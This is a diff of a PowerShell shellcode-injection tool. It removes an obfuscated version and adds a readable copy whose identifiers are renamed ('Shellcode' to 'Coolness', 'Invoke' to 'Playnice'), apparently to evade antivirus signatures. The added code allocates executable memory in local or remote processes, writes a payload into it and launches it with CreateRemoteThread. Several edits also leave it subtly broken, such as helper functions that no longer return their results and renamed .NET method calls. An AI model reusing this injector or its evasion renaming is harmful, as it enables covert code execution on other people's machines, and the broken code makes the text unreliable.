@@ -1,371 +1,270 @@
-  sET Nz5E0H  ([tYpE]("{2}{3}{1}{7}{6}{4}{0}{5}"-f 'DerAC','Em.ReFLEcTIon.eMIt.','s','YsT','Il','cesS','BU','aSseMbly')  )  ; SEt ("v5"+"W")  (  [TyPE]("{7}{4}{3}{8}{0}{2}{9}{6}{5}{1}"-f 'ON.CA','s','LL','.refLEc','EM','nTIon','onVe','sySt','tI','iNGC'))  ;SEt ('T1'+'Czb') ([Type]("{1}{2}{0}" -F 'N','aPpD','OmAi'))  ;  $hyaOxt =[TYPe]("{2}{0}{1}" -F'stem.a','rraY','sY');  Sv  ('v'+'iB')  ([TYpe]("{1}{0}" -F'oL','bo') ) ;   Sv  ('dhv63'+'K')  (  [tYpE]("{0}{1}{2}"-f 'intP','T','r') )  ;   SEt-ItEM  ('varIablE:'+'HA'+'fu'+'DW') (  [TyPE]("{1}{0}" -F'Nt32','UI')  )  ; sET-VARIABle  wyTD8  ( [TyPe]("{6}{4}{2}{3}{1}{0}{5}"-F 'RsH','ERvIcEs.MA','IME','.inTeROPs','YSteM.runt','aL','s')  )  ;  function iNVokE`-`S`heLLCODE
+function Playnice-Coolness
 {
-[CmdletBinding( dEfaULtpARAmETErSEtNAME = {"{2}{1}{0}"-f 'l','unLoca','R'}, supPoRTsSHouldprOCess = ${Tr`Ue} , cONfiRmiMPaCT = "HI`GH")] Param (
+
+
+[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
     [ValidateNotNullOrEmpty()]
     [UInt16]
-    ${p`R`o`CesSID},
-    
-    [Parameter( pAraMeteRSEtname = "RuNLo`c`Al" )]
+    $ProcessID,
+    [Parameter( ParameterSetName = 'RunLocal' )]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
-    ${S`hE`llc`ode},
-    
+    $Coolness,
     [Switch]
-    ${FoR`ce} = ${F`ALSe}
+    $Force = $False
 )
-
-    &("{0}{1}{2}{3}"-f 'Set-S','trict','Mod','e') -Version 2.0
-
-    if ( ${pS`BoUnDp`A`R`A`MeTers}[("{2}{1}{0}" -f 'D','essI','Proc')] )
+    Set-StrictMode -Version 2.0
+    if ( $PSBoundParameters['ProcessID'] )
     {
-        
-        
-        &("{2}{0}{1}{3}"-f'et-P','ro','G','cess') -Id ${proCE`ss`ID} -ErrorAction ("{1}{0}" -f 'p','Sto') | &("{1}{2}{0}" -f't-Null','O','u')
+        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
     }
-    
-    function l`o`Ca`l:gEt-DElE`gAtETY`pe
+    function Local:Get-DelegateType
     {
         Param
         (
             [OutputType([Type])]
-            
-            [Parameter( POSitION = 0)]
+            [Parameter( Position = 0)]
             [Type[]]
-            ${PArA`M`eTeRS} = (&("{2}{0}{1}" -f 'e','ct','New-Obj') ("{0}{1}"-f'Type[',']')(0)),
-            
-            [Parameter( pOsItion = 1 )]
+            $Parameters = (New-Object Type[](0)),
+            [Parameter( Position = 1 )]
             [Type]
-            ${ReT`Ur`NtyPE} = [Void]
+            $ReturnType = [Void]
         )
+        $Domain = [AppDomain]::CurrentDomain
+        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+        $MethodBuilder = $TypeBuilder.DefineMethod('Playnice', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
 
-        ${DO`mAiN} =  $T1Czb::"cUrrEnt`dO`M`AiN"
-        ${DYn`ASs`e`mbLy} = &("{1}{2}{3}{0}"-f 'Object','N','e','w-') ("{1}{5}{3}{0}{2}{4}" -f'mb','Sy','lyNa','Reflection.Asse','me','stem.')(("{4}{0}{3}{2}{5}{1}"-f'e','e','tedDeleg','flec','R','at'))
-        ${AsSEm`BL`yBuil`dEr} = ${DOm`AIN}."DE`FIn`edy`NaM`iCAS`seMB`Ly"(${d`YNASSE`mbLy},  (dIR  vAriabLe:nz5e0h ).valuE::"R`Un")
-        ${mO`d`UL`eBUILDEr} = ${A`s`SEMblybUiLd`eR}.("{0}{4}{2}{3}{1}" -f'DefineDyna','e','icM','odul','m').Invoke(("{2}{1}{0}{3}"-f'oryModul','em','InM','e'), ${F`AlSe})
-        ${TyPe`BU`ild`ER} = ${mO`Du`leb`UI`lDER}.("{0}{2}{1}" -f 'D','ineType','ef').Invoke(("{4}{3}{1}{2}{0}" -f'pe','T','y','legate','MyDe'), ("{7}{5}{0}{3}{4}{6}{9}{8}{1}{2}"-f ', Se','l','ass','a','led','blic',', Ansi','Class, Pu','oC','Class, Aut'), [System.MulticastDelegate])
-        ${C`OnSTr`UC`To`RBui`LDER} = ${t`YPEBU`IlD`er}.("{2}{3}{0}{1}{4}" -f'struct','o','DefineCo','n','r').Invoke(("{5}{1}{7}{6}{2}{3}{0}{4}" -f'g,','TS',', HideByS','i',' Public','R','ame','pecialN'),   (VaRiABLE  ("V5"+"W")  ).vALue::"staN`DArD", ${Pa`RAMet`ErS})
-        ${C`OnS`TR`UC`ToRBuI`LDER}.("{4}{0}{2}{1}{3}{5}" -f 'em','ationFl','ent','a','SetImpl','gs').Invoke(("{1}{0}{2}"-f 'untime, Manag','R','ed'))
-        ${m`EtHO`D`B`UILDeR} = ${T`YPEBuILD`eR}.("{3}{2}{1}{0}"-f'od','th','neMe','Defi').Invoke('Invoke', ("{9}{2}{6}{8}{10}{0}{4}{7}{3}{5}{1}"-f 'N','al','ublic, H',' V','ewS','irtu','ideB','lot,','yS','P','ig, '), ${r`eTuR`Nty`pE}, ${Pa`RAm`E`TerS})
-        ${M`eT`hodBUIL`DeR}.("{4}{2}{3}{0}{1}" -f'F','lags','mentat','ion','SetImple').Invoke(("{2}{3}{1}{0}{4}"-f ' Ma','ime,','R','unt','naged'))
-        
-        &("{2}{0}{1}"-f'rite-Ou','tput','W') ${Ty`p`Ebuild`eR}.("{2}{0}{1}" -f 'p','e','CreateTy').Invoke()
     }
-
-    function lOCA`L:`get-procAddRE`SS
+    function Local:Get-ProcAddress
     {
         Param
         (
             [OutputType([IntPtr])]
-        
-            [Parameter( POSITIOn = 0, MANDATORY = ${t`RUE} )]
+            [Parameter( Position = 0, Mandatory = $True )]
             [String]
-            ${M`odULE},
-            
-            [Parameter( poSitION = 1, MandAtory = ${t`RuE} )]
+            $Module,
+            [Parameter( Position = 1, Mandatory = $True )]
             [String]
-            ${pR`oc`EDuRE}
+            $Procedure
         )
+        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+        $Kern32Handle = $GetModuleHandle.Playnice($null, @($Module))
+        $tmpPtr = New-Object IntPtr
+        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
 
-        
-        ${SYS`T`emASS`embLY} =  (cHiLDITEM ('vaRi'+'AB'+'le:t1'+'CZB')  ).vALUE::"Cu`RrenT`D`o`MaIN".("{1}{0}{3}{2}{4}" -f 's','GetAs','e','embli','s').Invoke() |
-            &("{0}{2}{3}{1}" -f 'Wher','bject','e','-O') { ${_}."gloBalassEMBl`Y`cA`cHe" -And ${_}."loCA`TI`On".("{1}{0}"-f'it','Spl').Invoke('\\')[-1].("{0}{1}{2}" -f 'Eq','ua','ls').Invoke(("{1}{0}{2}" -f'ste','Sy','m.dll')) }
-        ${u`NsAfE`N`ATIv`E`Me`ThOdS} = ${sYste`Ma`s`Se`MBly}.("{0}{2}{1}"-f 'GetT','e','yp').Invoke(("{3}{7}{4}{2}{6}{1}{0}{5}"-f'eth','ativeM','Wi','Mi','.','ods','n32.UnsafeN','crosoft'))
-        
-        ${GETMoDU`LEh`AnD`le} = ${unsAFEn`A`TIvEMeTh`OdS}.("{2}{1}{0}"-f'od','Meth','Get').Invoke(("{2}{1}{0}" -f'e','l','GetModuleHand'))
-        ${G`Et`pRO`cADdREsS} = ${UNSAF`e`NaTivem`E`TH`ODs}.("{1}{0}"-f 'Method','Get').Invoke(("{3}{0}{2}{1}{4}"-f 't','Add','Proc','Ge','ress'))
-        
-        ${KERn`32haNd`LE} = ${Ge`T`mOdUl`eHAn`DlE}."In`VO`kE"(${N`UlL}, @(${m`od`UlE}))
-        ${tmP`P`TR} = &("{0}{3}{1}{2}" -f'New-','b','ject','O') ("{2}{1}{0}"-f'r','tPt','In')
-        ${H`AnDler`Ef} = &("{0}{2}{1}"-f 'New-O','ect','bj') ("{1}{6}{8}{3}{7}{2}{4}{0}{5}"-f'ices.H','S','ime.Inte','m.Ru','ropServ','andleRef','y','nt','ste')(${tM`p`pTr}, ${k`Er`N32H`ANDLE})
-        
-        
-        &("{2}{1}{0}"-f'Output','ite-','Wr') ${g`eT`pRo`caDdREsS}."IN`V`OkE"(${nu`Ll}, @([System.Runtime.InteropServices.HandleRef]${H`ANDl`er`ef}, ${pR`OCe`DU`RE}))
     }
-
-    
-    function LO`Ca`l`:`emiT-calLThReadsTUB ([IntPtr] ${b`As`EADDR}, [IntPtr] ${ExI`TTh`REAd`AD`DR}, [Int] ${archI`T`eCT`U`Re})
+    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
     {
-        ${I`NtSiZ`EpTR} = ${aR`cHiTeCT`UrE} / 8
+        $IntSizePtr = $Architecture / 8
+        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
+        {
+            $LittleEndianByteArray = New-Object Byte[](0)
+            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
+            [System.Array]::Reverse($LittleEndianByteArray)
 
-        function L`Oc`Al:cOn`VeRT`T`O-litT`L`eEnd`iAn ([IntPtr] ${aD`dress})
-        {
-            ${LittL`EEN`DI`ANB`YTea`RRAy} = &("{1}{2}{3}{0}"-f't','N','ew-O','bjec') ("{1}{0}" -f 'yte[]','B')(0)
-            ${aDd`RE`Ss}.("{0}{1}"-f 'To','String').Invoke("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | &("{4}{2}{0}{3}{1}" -f'Obj','ct','rEach-','e','Fo') { if (${_}) { ${L`ITtlEENDiA`Nby`TE`ARRaY} += [Byte] ('0x{0}' -f ${_}) } }
-              ( LS  varIABLe:hYAoXT  ).vaLue::("{2}{1}{0}"-f 'se','ver','Re').Invoke(${l`ItT`lE`Endi`ANB`yTE`ArrAY})
-            
-            &("{0}{2}{1}"-f 'Wr','ut','ite-Outp') ${litT`l`eeNdIanbYT`ea`RRAy}
         }
-        
-        ${calL`s`TUB} = &("{2}{0}{1}"-f'c','t','New-Obje') ("{1}{0}" -f'yte[]','B')(0)
-        
-        if (${INt`s`Ize`PTr} -eq 8)
+        $CallStub = New-Object Byte[](0)
+        if ($IntSizePtr -eq 8)
         {
-            [Byte[]] ${CaL`L`stUb} = 0x48,0xB8                      
-            ${Cal`lS`Tub} += &("{0}{1}{4}{5}{2}{3}"-f'C','o','tl','eEndian','nv','ertTo-Lit') ${B`A`SeAddr}       
-            ${cALl`St`UB} += 0xFF,0xD0                              
-            ${cAL`LsT`Ub} += 0x6A,0x00                              
-            ${C`All`sTuB} += 0x48,0xB8                              
-            ${C`A`l`lStUB} += &("{6}{5}{4}{1}{3}{0}{2}" -f 'ia','t','n','leEnd','it','tTo-L','Conver') ${E`xitthREA`da`dDR} 
-            ${CALlS`T`Ub} += 0xFF,0xD0                              
+            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &Coolness
+            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &Coolness
+            $CallStub += 0xFF,0xD0                              # CALL  RAX
+            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
+            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
+            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
+            $CallStub += 0xFF,0xD0                              # CALL  RAX
         }
         else
         {
-            [Byte[]] ${c`AlLs`TuB} = 0xB8                           
-            ${CaLL`STuB} += &("{2}{3}{0}{6}{4}{1}{5}" -f'o-LittleEn','a','Conver','tT','i','n','d') ${baSE`ADdR}       
-            ${c`ALls`T`UB} += 0xFF,0xD0                              
-            ${C`ALLs`TUb} += 0x6A,0x00                              
-            ${C`ALls`TUb} += 0xB8                                   
-            ${caLL`s`Tub} += &("{0}{4}{2}{1}{3}" -f 'ConvertTo-Litt','ndi','E','an','le') ${eXIT`TH`REAdAd`dR} 
-            ${caLL`S`TuB} += 0xFF,0xD0                              
+            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &Coolness
+            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &Coolness
+            $CallStub += 0xFF,0xD0                              # CALL  EAX
+            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
+            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
+            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
+            $CallStub += 0xFF,0xD0                              # CALL  EAX
         }
-        
-        &("{1}{3}{0}{2}"-f 'tp','Writ','ut','e-Ou') ${c`All`StUB}
+
     }
-
-    function lO`caL`:InjeCt-`RemO`Tes`HE`LLC`Ode ([Int] ${P`R`oCeSSiD})
+    function Local:Neat-RemoteCoolness ([Int] $ProcessID)
     {
-        
-        ${HPR`OCeSs} = ${o`peN`p`RoceSS}."i`N`VoKE"(0x001F0FFF, ${faL`SE}, ${pROC`E`SSiD}) 
-        
-        if (!${hp`Ro`Cess})
+        $hProcess = $OpenProcess.Playnice(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
+        if (!$hProcess)
         {
-            Throw ('Unabl'+'e'+' '+'to'+' '+'open'+' '+'a '+'pr'+'oce'+'ss '+'ha'+'ndle '+'for'+' '+'PID:'+' '+"$ProcessID")
+            Throw "Unable to open a process handle for PID: $ProcessID"
         }
-
-        ${I`Swow`64} = ${f`AlSE}
-
-        if (${6`4BIt`OS}) 
+        $IsWow64 = $false
+        if ($64bitOS) # Only perform theses checks if CPU is 64-bit
         {
-            
-            ${iSwoW`64P`RoCE`SS}."IN`VoKe"(${h`pr`ocEsS}, [Ref] ${I`SWoW64}) | &("{1}{0}"-f 'ut-Null','O')
-            
-            if ((!${ISWo`w64}) -and ${p`OWeRsHe`L`l32BIt})
+            $IsWow64Process.Playnice($hProcess, [Ref] $IsWow64) | Out-Null
+            if ((!$IsWow64) -and $PowerShell32bit)
             {
-                Throw ("{0}{18}{1}{26}{9}{25}{23}{11}{7}{19}{15}{6}{16}{20}{12}{14}{30}{22}{13}{21}{3}{10}{4}{17}{24}{28}{29}{27}{5}{2}{8}" -f'Shel','de in','ell if you want th','ot supported. ',' t','h','bit proce',' 6','is to work.','ection','Use','ting a','2-b','owerShell is','it','-','ss f','he 64-bi','lco','4','rom 3',' n','P','arge','t ',' t','j','wers','version o','f Po',' ')
+                Throw 'Coolness Neation targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
             }
-            elseif (${iSw`OW`64}) 
+            elseif ($IsWow64) # 32-bit Wow64 process
             {
-                if (${Sh`E`LlCOde32}."lENg`TH" -eq 0)
+                if ($Coolness32.Length -eq 0)
                 {
-                    Throw ('No'+' '+'she'+'ll'+'code '+'w'+'as '+'plac'+'ed '+'in'+' '+'th'+'e '+(('1WpShel'+'lcode'+'32'+' ')  -REplACe  ([chAR]49+[chAR]87+[chAR]112),[chAR]36)+'va'+'riabl'+'e!')
+                    Throw 'No Coolness was placed in the $Coolness32 variable!'
                 }
-                
-                ${shE`llC`ODE} = ${SHe`l`lCod`e32}
-                &("{3}{2}{1}{0}"-f'e','s','ite-Verbo','Wr') ("{0}{3}{5}{6}{1}{2}{4}"-f 'I','ow6','4','njecting',' process.',' in','to a W')
-                &("{0}{1}{3}{2}"-f'Wr','ite-V','se','erbo') ("{4}{6}{7}{0}{5}{1}{3}{2}" -f's','l','e.','cod','Using 32-bi','hel','t',' ')
+                $Coolness = $Coolness32
+
+
             }
-            else 
+            else # 64-bit process
             {
-                if (${SHEllCO`D`e`64}."lE`Ngth" -eq 0)
+                if ($Coolness64.Length -eq 0)
                 {
-                    Throw ('No'+' '+'she'+'ll'+'cod'+'e '+'w'+'as '+'placed'+' '+'i'+'n '+'the'+' '+('SNO'+'Shellcode'+'64'+' ').("{1}{0}" -f'EpLaCE','r').Invoke('SNO','$')+'varia'+'bl'+'e!')
+                    Throw 'No Coolness was placed in the $Coolness64 variable!'
                 }
-                
-                ${she`Llc`ODE} = ${SH`ELLCodE`64}
-                &("{0}{1}{2}" -f 'Wri','te-V','erbose') ("{4}{1}{3}{0}{2}" -f 'llcode','ing 64-bit ','.','she','Us')
+                $Coolness = $Coolness64
+
             }
         }
-        else 
+        else # 32-bit CPU
         {
-            if (${shE`llcod`e`32}."le`Ngth" -eq 0)
+            if ($Coolness32.Length -eq 0)
             {
-                Throw ('No'+' '+'sh'+'ell'+'cod'+'e '+'wa'+'s '+'plac'+'ed '+'in'+' '+'the'+' '+('glTS'+'hel'+'lco'+'de32 ')."rEP`LACe"('glT',[STRing][Char]36)+'va'+'riable'+'!')
+                Throw 'No Coolness was placed in the $Coolness32 variable!'
             }
-            
-            ${SHel`l`CoDE} = ${sheLlC`O`D`E32}
-            &("{1}{0}{2}" -f'Verbo','Write-','se') ("{3}{4}{1}{0}{2}"-f'shel','it ','lcode.','Usi','ng 32-b')
+            $Coolness = $Coolness32
+
+        }
+        $RemoteMemAddr = $VirtualAllocEx.Playnice($hProcess, [IntPtr]::Zero, $Coolness.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        if (!$RemoteMemAddr)
+        {
+            Throw "Unable to allocate Coolness memory in PID: $ProcessID"
         }
 
-        
-        ${r`eMOTEmem`ADDr} = ${V`iRTUal`ALloc`EX}."I`NV`Oke"(${H`p`ROCEsS},  (  Get-VaRiABlE  ("D"+"Hv6"+"3k")).valuE::"ze`RO", ${S`heLL`cO`De}."Leng`TH" + 1, 0x3000, 0x40) 
-        
-        if (!${r`eMoT`eMeM`A`dDR})
+        $WriteProcessMemory.Playnice($hProcess, $RemoteMemAddr, $Coolness, $Coolness.Length, [Ref] 0) | Out-Null
+        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
+        if ($IsWow64)
         {
-            Throw ('Unab'+'l'+'e '+'to'+' '+'allo'+'cat'+'e '+'shellco'+'d'+'e '+'memo'+'ry'+' '+'in'+' '+'PID:'+' '+"$ProcessID")
-        }
-        
-        &("{2}{0}{1}" -f'e-V','erbose','Writ') "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)")) "
+            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
 
-        
-        ${wR`i`T`epR`oCESsmEm`ORy}."iN`VoKe"(${HPR`Oce`sS}, ${R`em`OtememAdDR}, ${s`HeL`LcOdE}, ${she`l`lc`OdE}."l`e`NgTH", [Ref] 0) | &("{1}{0}" -f 'Null','Out-')
-
-        
-        ${EXIT`ThRe`AD`AD`Dr} = &("{0}{2}{1}"-f'Get-ProcAddre','s','s') ("{0}{1}{2}{3}"-f 'kern','el32.d','l','l') ("{2}{0}{1}"-f 'hr','ead','ExitT')
-
-        if (${iSwo`w64})
-        {
-            
-            ${C`ALLst`UB} = &("{0}{1}{3}{4}{2}" -f 'Emi','t-Call','tub','T','hreadS') ${Re`moTeMe`mAD`dR} ${EXittH`Re`AdaD`dR} 32
-            
-            &("{3}{0}{2}{1}{4}" -f'-','rb','Ve','Write','ose') ("{5}{0}{6}{3}{7}{1}{2}{4}"-f'i','all ','stu','-bit assembly ','b.','Em','tting 32','c')
         }
         else
         {
-            
-            ${CA`lL`STUb} = &("{0}{2}{4}{1}{5}{3}"-f'E','re','mit-Cal','Stub','lTh','ad') ${rEMo`T`eMemaddr} ${ExitTHRE`AdaD`DR} 64
-            
-            &("{0}{1}{2}{3}{4}"-f'Write-','V','er','b','ose') ("{2}{1}{8}{6}{3}{7}{0}{4}{5}" -f'c','t','Emi',' ','all stu','b.','ng','64-bit assembly ','ti')
-        }
+            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
 
-        
-        ${r`EMOteST`U`BA`DDr} = ${v`I`RtuA`LaLL`oCEX}."INV`o`kE"(${Hpr`oCESs},   (Get-vArIaBLe DHV63k  -VALUeoN  )::"zE`Ro", ${caL`lstUB}."le`NGTH", 0x3000, 0x40) 
-        
-        if (!${RE`moTESt`UB`AdDR})
+        }
+        $RemoteStubAddr = $VirtualAllocEx.Playnice($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        if (!$RemoteStubAddr)
         {
-            Throw ('Unabl'+'e '+'to'+' '+'a'+'l'+'locate '+'t'+'hr'+'ead '+'cal'+'l '+'st'+'ub '+'m'+'emory'+' '+'in'+' '+'PI'+'D: '+"$ProcessID")
+            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
         }
-        
-        &("{1}{2}{0}{4}{3}" -f 't','Wr','i','Verbose','e-') "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)")) "
 
-        
-        ${w`RItEP`RoCe`SSm`e`MoRy}."INvO`KE"(${h`P`R`oCEsS}, ${rEM`o`TESTuba`D`dr}, ${C`A`llstUb}, ${CALL`St`Ub}."LeN`gTH", [Ref] 0) | &("{0}{1}"-f'Out','-Null')
-
-        
-        ${t`hREaDh`An`dLe} = ${CRE`At`eReMot`ethre`AD}."I`NVokE"(${HPrOc`E`Ss},  $DHV63k::"zE`RO", 0, ${rEmOT`es`T`Ub`ADdR}, ${r`e`MOt`em`eMaDDr}, 0,   ( variABLe DhV63k).vaLUe::"Z`ero")
-        
-        if (!${Th`READha`N`d`le})
+        $WriteProcessMemory.Playnice($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null
+        $ThreadHandle = $CreateRemoteThread.Playnice($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
+        if (!$ThreadHandle)
         {
-            Throw ('Una'+'ble '+'to'+' '+'laun'+'ch'+' '+'r'+'emot'+'e '+'thr'+'ead '+'in'+' '+'PID:'+' '+"$ProcessID")
+            Throw "Unable to launch remote thread in PID: $ProcessID"
         }
+        $CloseHandle.Playnice($hProcess) | Out-Null
 
-        
-        ${cL`OSe`haND`LE}."i`NVoKe"(${hP`R`Oce`Ss}) | &("{1}{2}{0}"-f'ull','Out','-N')
-
-        &("{1}{0}{2}"-f'Ver','Write-','bose') ("{5}{7}{3}{0}{8}{2}{1}{6}{4}" -f'e inje','mple',' co','cod','!','Sh','te','ell','ction')
     }
-
-    function lO`caL`:`iNjEcT-L`OCals`hEL`l`CoDE
+    function Local:Neat-LocalCoolness
     {
-        if (${P`OweRsH`el`L32`BIt}) {
-            if (${SH`ellcod`e32}."l`E`Ngth" -eq 0)
+        if ($PowerShell32bit) {
+            if ($Coolness32.Length -eq 0)
             {
-                Throw ('No'+' '+'s'+'h'+'ellcode '+'wa'+'s '+'pla'+'c'+'ed '+'in'+' '+'th'+'e '+('{0}'+'Shellc'+'ode3'+'2 ')-f[cHAR]36+'var'+'i'+'able!')
+                Throw 'No Coolness was placed in the $Coolness32 variable!'
                 return
             }
-            
-            ${s`heLlcO`De} = ${sH`eL`LCoDe32}
-            &("{2}{3}{1}{0}" -f 'ose','rb','Wri','te-Ve') ("{1}{5}{2}{6}{0}{4}{3}" -f' s','U','ing','ode.','hellc','s',' 32-bit')
+            $Coolness = $Coolness32
+
         }
         else
         {
-            if (${SHEL`lcOD`e`64}."L`En`gth" -eq 0)
+            if ($Coolness64.Length -eq 0)
             {
-                Throw ('No'+' '+'s'+'hell'+'cod'+'e '+'w'+'as '+'pl'+'ace'+'d '+'in'+' '+'t'+'he '+('{0}Shell'+'co'+'d'+'e'+'64 ')  -F [CHaR]36+'v'+'a'+'riable!')
+                Throw 'No Coolness was placed in the $Coolness64 variable!'
                 return
             }
-            
-            ${sHEll`cO`de} = ${ShEL`Lco`D`e64}
-            &("{2}{1}{0}"-f '-Verbose','e','Writ') ("{6}{0}{1}{4}{5}{2}{3}" -f'4-bit',' she','code','.','l','l','Using 6')
-        }
-    
-        
-        ${bas`EA`dDReSs} = ${VIrTUAL`ALl`oC}."iNV`O`KE"(  (  item  vaRIAble:Dhv63K  ).vaLUe::"z`ero", ${shE`l`lcOde}."LE`Ng`TH" + 1, 0x3000, 0x40) 
-        if (!${bAsEaDd`R`e`Ss})
-        {
-            Throw ('Una'+'ble '+'to'+' '+'al'+'l'+'oc'+'ate '+'s'+'h'+'ellcode '+'memo'+'ry'+' '+'i'+'n '+'PID'+': '+"$ProcessID")
-        }
-        
-        &("{1}{2}{0}"-f 'ose','Wr','ite-Verb') "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)")) "
+            $Coolness = $Coolness64
 
-        
-         ( varIAble  ("wytd"+"8")  -vALueONLy  )::("{1}{0}" -f 'opy','C').Invoke(${Sh`EL`LcoDE}, 0, ${BasEa`DD`REsS}, ${She`lL`C`Ode}."Len`GtH")
-        
-        
-        ${ExIT`ThRE`Ad`AdDr} = &("{1}{0}{2}{3}"-f'oc','Get-Pr','Addre','ss') ("{1}{2}{0}"-f'll','ke','rnel32.d') ("{2}{0}{1}"-f 'xitTh','read','E')
-        
-        if (${pow`eR`She`lL32`Bit})
+        }
+        $BaseAddress = $VirtualAlloc.Playnice([IntPtr]::Zero, $Coolness.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        if (!$BaseAddress)
         {
-            ${c`AlLS`TUB} = &("{0}{1}{4}{3}{2}"-f'Emi','t-Call','b','readStu','Th') ${basEa`dDR`eSs} ${E`xItt`hREaDA`Ddr} 32
-            
-            &("{1}{3}{0}{2}"-f 'r','Write-V','bose','e') ("{5}{6}{0}{1}{3}{2}{7}{4}"-f'g ','32',' ass','-bit','call stub.','Em','ittin','embly ')
+            Throw "Unable to allocate Coolness memory in PID: $ProcessID"
+        }
+
+        [System.Runtime.InteropServices.Marshal]::Copy($Coolness, 0, $BaseAddress, $Coolness.Length)
+        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
+        if ($PowerShell32bit)
+        {
+            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
+
         }
         else
         {
-            ${CALL`S`TuB} = &("{1}{0}{3}{2}{5}{4}"-f'm','E','Th','it-Call','adStub','re') ${baSeAdDr`E`SS} ${eXittHReA`dA`ddR} 64
-            
-            &("{1}{2}{0}"-f 'e','Write-Ver','bos') ("{1}{6}{4}{3}{2}{5}{0}"-f'b.','Emitt','asse','-bit ','64','mbly call stu','ing ')
-        }
+            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
 
-        
-        ${CALls`Tu`B`AddrESs} = ${VI`Rt`U`AlAl`LoC}."i`NvOKE"(  (VarIabLe DhV63k ).vaLUe::"z`ERo", ${c`AlLS`Tub}."Le`NGTh" + 1, 0x3000, 0x40) 
-        if (!${cA`L`lstuBAd`DR`EsS})
+        }
+        $CallStubAddress = $VirtualAlloc.Playnice([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        if (!$CallStubAddress)
         {
-            Throw ("{8}{4}{0}{2}{7}{1}{3}{5}{6}" -f'lo','ead c','cate','all','l',' st','ub.',' thr','Unable to a')
+            Throw "Unable to allocate thread call stub."
         }
-        
-        &("{1}{0}{2}" -f'ite-V','Wr','erbose') "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)")) "
 
-        
-          (  cHiLdItEM  VaRIabLe:wyTd8).valuE::("{0}{1}" -f'Cop','y').Invoke(${c`Al`LsTUB}, 0, ${cAl`ls`Tub`AdD`Ress}, ${Ca`Ll`sTUB}."LENG`TH")
-
-        
-        ${threaD`hAn`Dle} = ${CreATe`T`hreaD}."i`NvOKE"( $Dhv63k::"Ze`Ro", 0, ${CA`LLSTUbAdDR`ess}, ${bAsEaD`D`ResS}, 0,   (  GEt-vaRIAbLE ('dHv'+'63K')).vAlUE::"Z`ERo")
-        if (!${TH`ReAdh`A`NDlE})
+        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)
+        $ThreadHandle = $CreateThread.Playnice([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
+        if (!$ThreadHandle)
         {
-            Throw ("{1}{3}{0}{6}{5}{7}{4}{2}"-f'lau','Unab','.','le to ','d','hr','nch t','ea')
+            Throw "Unable to launch thread."
         }
